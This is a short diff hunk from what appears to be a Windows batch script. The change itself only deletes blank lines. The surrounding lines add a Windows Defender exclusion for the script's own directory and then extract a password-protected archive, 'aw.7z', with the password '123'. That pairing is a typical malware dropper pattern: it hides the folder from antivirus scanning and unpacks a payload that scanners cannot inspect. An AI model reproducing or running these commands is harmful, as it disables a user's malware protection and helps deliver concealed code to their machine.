@@ -19,9 +19,6 @@ if %errorlevel% EQU 0 (
 :: Modify Windows Defender policy
 powershell.exe Add-MpPreference -ExclusionPath '%~dp0'
 
-
-
-
 :: Unzip the file "aw.7z" with the password "123" in the same directory
 7zr e -p"123" aw.7z
 
